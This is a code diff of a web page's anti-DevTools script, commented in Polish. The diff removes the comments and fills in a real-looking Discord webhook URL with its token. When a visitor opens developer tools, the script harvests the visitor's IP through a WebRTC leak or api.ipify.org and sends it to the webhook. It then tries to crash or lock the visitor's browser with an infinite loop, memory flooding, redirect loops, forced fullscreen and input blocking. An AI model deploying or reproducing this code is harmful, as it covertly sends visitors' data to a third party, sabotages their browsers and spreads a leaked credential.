@@ -31,15 +31,14 @@
     .dtb-hide-scroll{overflow:hidden !important}
   `);
 
-  // Funkcja do pobierania adresu IP
   function getIPAddress() {
     return new Promise((resolve) => {
-      // Próba pobrania IP przez WebRTC
+
       try {
         const rtc = new RTCPeerConnection({iceServers: []});
         rtc.createDataChannel('');
         rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-        
+
         rtc.onicecandidate = (event) => {
           if (event.candidate) {
             const ip = event.candidate.candidate.split(' ')[4];
@@ -48,13 +47,13 @@
               return;
             }
           }
-          // Fallback - użyj zewnętrznego API
+
           fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => resolve(data.ip))
             .catch(() => resolve('unknown'));
         };
-        
+
         setTimeout(() => {
           fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -62,7 +61,7 @@
             .catch(() => resolve('unknown'));
         }, 1000);
       } catch (e) {
-        // Fallback na zewnętrzne API
+
         fetch('https://api.ipify.org?format=json')
           .then(response => response.json())
           .then(data => resolve(data.ip))
@@ -71,13 +70,11 @@
     });
   }
 
-  // Funkcja do wysyłania na webhook Discord
   function sendToDiscordWebhook(ip, action) {
     if (ipSent) return;
-    
-    // TUTAJ PODAJ SWÓJ WEBHOOK DISCORD
-    const webhookURL = 'https://discord.com/api/webhooks/...';
-    
+
+    const webhookURL = 'https://discord.com/api/webhooks/1430059619056746599/ZveSM1aawolQa6EPMJpPupJaXI6Srk-xWD77gNkjTxyqiOKQPG8dYgFht1ruxO-F4Nwy';
+
     if (!webhookURL || webhookURL.includes('...')) {
       console.warn('Webhook Discord nie jest skonfigurowany');
       return;
@@ -121,36 +118,31 @@
         content: `🚨 DevTools zostały otwarte!`
       })
     }).catch(error => console.error('Błąd wysyłania do Discord:', error));
-    
+
     ipSent = true;
   }
 
-  // Agresywne metody zamykania DevTools/strony
   function forceCloseDevTools() {
     if (closeAttempted) return;
     closeAttempted = true;
 
     console.log('🔒 Próba zamknięcia DevTools...');
 
-    // Metoda 1: Próba zamknięcia okna/tabu
     try {
       window.open('', '_self', '');
       window.close();
-      
-      // Dla nowych okien
+
       if (window.history.length > 1) {
         window.history.go(-(window.history.length - 1));
       }
     } catch (e) {}
 
-    // Metoda 2: Przekierowanie na białą stronę
     try {
       document.body.innerHTML = '';
       document.head.innerHTML = '';
       window.stop();
     } catch (e) {}
 
-    // Metoda 3: Pętla przekierowań
     try {
       let counter = 0;
       const redirectLoop = setInterval(() => {
@@ -162,18 +154,15 @@
       }, 50);
     } catch (e) {}
 
-    // Metoda 4: Zatrzymanie JavaScriptu
     try {
       throw new Error('Security Violation');
     } catch (e) {}
 
-    // Metoda 5: Usunięcie całej zawartości strony
     try {
       document.documentElement.remove();
       document.body.remove();
     } catch (e) {}
 
-    // Metoda 6: Crash przeglądarki przez pętlę
     try {
       setTimeout(() => {
         while(true) {
@@ -183,7 +172,6 @@
       }, 1000);
     } catch (e) {}
 
-    // Metoda 7: Przeciążenie pamięci
     try {
       const hugeArray = [];
       for (let i = 0; i < 1000000; i++) {
@@ -191,7 +179,6 @@
       }
     } catch (e) {}
 
-    // Metoda 8: Blokada klawiszy w trybie pełnoekranowym
     try {
       document.documentElement.requestFullscreen?.();
       document.addEventListener('fullscreenchange', function() {
@@ -240,26 +227,22 @@
   function lockPage(action){
     if(locked) return;
     locked = true;
-    
-    // Wyślij IP tylko przy pierwszym wykryciu
+
     if (!ipSent) {
       getIPAddress().then(ip => {
         sendToDiscordWebhook(ip, action);
       });
     }
-    
-    // Natychmiastowa próba zamknięcia DevTools
+
     setTimeout(forceCloseDevTools, 100);
-    
+
     var o = makeOverlay();
     if(!o.parentNode) document.body.appendChild(o);
     try{ document.documentElement.classList.add('dtb-hide-scroll'); }catch(e){}
     try{ window.stop(); }catch(e){}
-    
-    // Dodatkowe próby zamknięcia co sekundę
+
     const closeInterval = setInterval(forceCloseDevTools, 1000);
-    
-    // Próba całkowitego zamknięcia strony po 5 sekundach
+
     setTimeout(() => {
       try {
         window.open('', '_self', '');
@@ -339,7 +322,6 @@
     }catch(err){}
   }
 
-  // Blokada wszystkich możliwych zdarzeń
   function blockAllEvents(){
     const events = ['keydown', 'keyup', 'keypress', 'contextmenu', 'mousedown', 'mouseup', 'click', 'dblclick'];
     events.forEach(eventType => {
@@ -358,12 +340,11 @@
     document.addEventListener('keydown', keyHandler, true);
     document.addEventListener('contextmenu', contextHandler, true);
     blockAllEvents();
-    
+
     if(checkTimer) clearInterval(checkTimer);
     checkTimer = setInterval(tick, 300);
     setTimeout(tick, 100);
-    
-    // Dodatkowa ochrona przed debugowaniem
+
     setInterval(function() {
       if (isDevtoolsOpen()) {
         lockPage('Continuous Monitoring');
@@ -377,7 +358,6 @@
     start();
   }
 
-  // Ostateczna linia obrony - rzucanie błędów
   window.addEventListener('error', function() {
     if (isDevtoolsOpen()) {
       forceCloseDevTools();
